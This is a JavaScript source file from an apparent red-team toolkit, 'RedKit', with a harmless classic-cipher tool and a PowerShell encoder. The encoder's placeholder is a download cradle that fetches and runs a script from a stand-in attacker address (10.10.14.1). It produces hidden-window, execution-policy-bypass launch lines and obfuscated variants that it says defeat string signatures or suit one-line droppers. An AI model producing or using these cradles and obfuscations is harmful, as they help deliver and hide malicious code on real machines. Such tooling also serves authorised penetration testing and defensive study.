// RedKit · crypto/ciphers.js (split from crypto.js)
// ===== CLASSIC CIPHERS =====
TOOLS['cipher'] = {
  title: 'Classic Ciphers',
  desc: 'Encrypt and decrypt classic ciphers including ROT13, Caesar, Atbash, Vigenère, and reverse.',
  render() {
    return `
      <div class="tool">
        ${card('Input', `
          ${field('', `<textarea id="cip-input" placeholder="enter text..."></textarea>`)}
          ${field('Caesar shift (for Caesar cipher)', `<input type="number" id="cip-shift" value="13">`)}
          ${field('Vigenère key (for Vigenère cipher)', `<input type="text" id="cip-key" placeholder="e.g. SECRET" autocomplete="off" spellcheck="false">`)}
          <div class="btn-row">
            <button class="btn" data-cmd="rot13">ROT13</button>
            <button class="btn" data-cmd="caesar">Caesar</button>
            <button class="btn" data-cmd="atbash">Atbash</button>
            <button class="btn" data-cmd="vig-enc">Vigenère Encrypt</button>
            <button class="btn" data-cmd="vig-dec">Vigenère Decrypt</button>
            <button class="btn" data-cmd="reverse">Reverse</button>
          </div>
        `)}
        ${card('', resultHead('Output', ghostBtn('cip-copy')) + `<div class="result-box" id="cip-output"></div>`, { id: 'cip-results', hidden: true })}
      </div>
    `;
  },
  init() {
    const caesar = (s, n) => s.replace(/[a-z]/gi, c => {
      const base = c <= 'Z' ? 65 : 97;
      return String.fromCharCode((c.charCodeAt(0) - base + n + 26) % 26 + base);
    });
    const atbash = s => s.replace(/[a-z]/gi, c => {
      const base = c <= 'Z' ? 65 : 97;
      return String.fromCharCode(25 - (c.charCodeAt(0) - base) + base);
    });
    // Vigenère: key cycles over alphabetic chars only; non-letters pass through and don't advance the key
    const vigenere = (s, key, decrypt) => {
      key = (key || '').replace(/[^a-z]/gi, '').toUpperCase();
      if (!key) return s;
      let ki = 0;
      return s.replace(/[a-z]/gi, c => {
        const base = c <= 'Z' ? 65 : 97;
        const k = key.charCodeAt(ki % key.length) - 65;
        ki++;
        const shift = decrypt ? 26 - k : k;
        return String.fromCharCode((c.charCodeAt(0) - base + shift) % 26 + base);
      });
    };
    $$('[data-cmd]', $('#cip-input').closest('.card')).forEach(b => {
      b.addEventListener('click', () => {
        const cmd = b.dataset.cmd;
        const txt = $('#cip-input').value;
        const n = parseInt($('#cip-shift').value) || 0;
        let r;
        if (cmd === 'rot13') r = caesar(txt, 13);
        else if (cmd === 'caesar') r = caesar(txt, n);
        else if (cmd === 'atbash') r = atbash(txt);
        else if (cmd === 'vig-enc') r = vigenere(txt, $('#cip-key').value, false);
        else if (cmd === 'vig-dec') r = vigenere(txt, $('#cip-key').value, true);
        else if (cmd === 'reverse') r = txt.split('').reverse().join('');
        $('#cip-output').textContent = r;
        $('#cip-results').style.display = 'block';
      });
    });
    wireCopy('cip-copy', () => $('#cip-output').textContent);
  }
};


// ===== POWERSHELL ENCODER (-EncodedCommand, Base64 UTF-16LE) =====
TOOLS['ps-encode'] = {
  title: 'PowerShell Encoder',
  desc: 'Encode a PowerShell command into multiple execution and obfuscation variants.',
  render() {
    return `
      <div class="tool">
        ${card('PowerShell Command', `
          ${field('Command to encode', `<textarea id="pe-in" placeholder="IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.1/s.ps1')"></textarea>`)}
          ${field('Flags', `<div class="pe-flags">
            <label class="pe-chk"><input type="checkbox" id="pe-nop" checked> -NoProfile</label>
            <label class="pe-chk"><input type="checkbox" id="pe-win" checked> -WindowStyle Hidden</label>
            <label class="pe-chk"><input type="checkbox" id="pe-ep" checked> -ExecutionPolicy Bypass</label>
            <label class="pe-chk"><input type="checkbox" id="pe-noni"> -NonInteractive</label>
          </div>`)}
        `)}
        <div id="pe-out"></div>
      </div>`;
  },
  init() {
    const out = $('#pe-out');
    const u16 = (s) => { let b = ''; for (let i = 0; i < s.length; i++) { const c = s.charCodeAt(i); b += String.fromCharCode(c & 0xff) + String.fromCharCode((c >> 8) & 0xff); } return btoa(b); };
    const u8 = (s) => { try { return btoa(unescape(encodeURIComponent(s))); } catch (e) { return btoa(s); } };
    const flags = () => {
      const f = [];
      if ($('#pe-nop').checked) f.push('-nop');
      if ($('#pe-win').checked) f.push('-w hidden');
      if ($('#pe-ep').checked) f.push('-ep bypass');
      if ($('#pe-noni').checked) f.push('-noni');
      return f.length ? f.join(' ') + ' ' : '';
    };

    // gzip+base64 of the current command (async; populated by refresh())
    let gz = '';
    const computeGz = async (cmd) => {
      gz = '';
      if (!cmd || !window.CompressionStream) return;
      try {
        const data = new TextEncoder().encode(cmd);
        const stream = new Blob([data]).stream().pipeThrough(new CompressionStream('gzip'));
        const buf = new Uint8Array(await new Response(stream).arrayBuffer());
        let bin = ''; for (let i = 0; i < buf.length; i++) bin += String.fromCharCode(buf[i]);
        gz = btoa(bin);
      } catch (e) { gz = ''; }
    };

    const variants = (cmd) => {
      const fp = flags();
      const list = [
        ['EncodedCommand (Base64, UTF-16LE)', 'Raw Base64 for the -EncodedCommand / -e flag. The canonical PowerShell encoding.', u16(cmd)],
        ['Full -EncodedCommand', 'Ready-to-run command line using the flags selected above.', `powershell.exe ${fp}-enc ${u16(cmd)}`],
        ['IEX FromBase64 (UTF-16LE)', 'Decodes the Base64 at runtime and runs it with IEX (Unicode).', `powershell ${fp}-c "IEX([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('${u16(cmd)}')))"`],
        ['IEX FromBase64 (UTF-8)', 'Same idea using UTF-8, which gives shorter Base64 for ASCII commands.', `powershell ${fp}-c "IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('${u8(cmd)}')))"`],
        ['Char-code array (IEX)', 'Rebuilds the command from character codes (no Base64 string present).', `powershell ${fp}-c "IEX(([char[]](${[...cmd].map(c => c.charCodeAt(0)).join(',')}) -join ''))"`],
        ['Base64 (UTF-8, raw)', 'Plain UTF-8 Base64 of the command, with no wrapper.', u8(cmd)],
        ['cmd.exe wrapper', 'Launches via cmd.exe, handy inside .bat files or one-line droppers.', `cmd.exe /c powershell.exe ${fp}-enc ${u16(cmd)}`],
      ];
      if (gz) list.splice(2, 0, ['Gzip + Base64 cradle', 'Compresses the payload, then decompresses and runs it at runtime. Smaller, and defeats naive string signatures.', `powershell ${fp}-c "IEX(New-Object IO.StreamReader(New-Object IO.Compression.GzipStream([IO.MemoryStream][Convert]::FromBase64String('${gz}'),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()"`]);
      return list;
    };

    let cur = 0;
    const render = () => {
      const cmd = $('#pe-in').value;
      if (!cmd) { out.innerHTML = ''; return; }
      const V = variants(cmd);
      cur = Math.min(cur, V.length - 1);
      out.innerHTML = card('', `
        <div class="not-formats">${V.map(([n], i) => `<button class="not-fmt" data-i="${i}">${escapeHtml(n)}</button>`).join('')}</div>
        <div class="result-header"><h4 class="not-fmt-title"></h4><button class="btn btn-ghost" id="pe-copy">Copy</button></div>
        <p class="pe-desc" id="pe-desc"></p>
        <pre class="not-pre mono" id="pe-result"></pre>
        <div class="pe-info" id="pe-info"></div>
      `);
      const show = (i) => {
        cur = i;
        const [name, desc, val] = V[i];
        $('#pe-result', out).textContent = val;
        $('.not-fmt-title', out).textContent = name;
        $('#pe-desc', out).textContent = desc;
        const n = val.length, over = n > 8191;
        $('#pe-info', out).textContent = over ? `${n} characters. Exceeds the cmd.exe 8191-character command-line limit.` : `${n} characters`;
        $('#pe-info', out).classList.toggle('pe-warn', over);
        $$('.not-fmt', out).forEach((b, j) => b.classList.toggle('active', j === i));
      };
      $$('.not-fmt', out).forEach(b => b.addEventListener('click', () => show(+b.dataset.i)));
      wireCopy('pe-copy', () => $('#pe-result', out).textContent);
      show(cur);
    };

    const refresh = async () => { await computeGz($('#pe-in').value); render(); };
    $('#pe-in').addEventListener('input', refresh);
    $$('.pe-flags input').forEach(c => c.addEventListener('change', render));
    refresh();
  }
};

